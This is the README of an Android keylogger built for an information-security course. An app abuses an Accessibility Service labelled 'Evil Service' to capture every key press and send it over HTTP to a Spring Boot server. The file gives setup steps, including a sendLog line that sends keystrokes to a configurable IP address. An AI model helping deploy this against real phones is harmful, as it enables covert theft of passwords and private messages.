# Android Keylogger

This is a project implemented as Project for the Information Systems Security Course. The main idea is developing a basic key logger for android mobile devices.

## Modules
* keylogapp => Basic Android Java Mobile Application that logs keys
* keylogweb => Spring Boot Web Application that receives logged keys

## How It Works
[Keylogger.png](./diagrams/Keylogger.png)

**Notes:**

## Usage
1. Deploy **keylogweb** application
    * NOTE: your andorid phone must have access to the server that web application running via network or internet etc.
    * You can directly start with following command:
        ```bash
        mvn clean package spring-boot:run
        ```
2. Prepare **keylogapp** for deployment
   1. [Go To KeyLogger.java](https://github.com/maemresen/android-keylogger/blob/main/keylogapp/app/src/main/java/com/maemresen/infsec/keylogapp/KeyLogger.java) 
   2. Find the following line
        ```
        sendLog("http://192.168.1.37:8080/keylog/save", keyLog);
        ```
    3. Replace `192.168.1.37` with the IP of the machine that you deploy `keylogweb` 
3. You should enable **Evil Service** which listens key press and send them to the server
   * after installed the App, you have to open Accessibility settings. (A button named **Evil Service** is added as a shortcut to directly jump accesibility settings.) Then at the bottom of the page, you will see **Evil Service** under Downloaded Services. You should enable Evil Service from there. Then it will works.
4. You can check your browser and you will see that each key-press on your Android phone will be printed to the web-page. **! Hint:** Do not forget to refresh browser manually. Auto-refresh feature not implemented :)
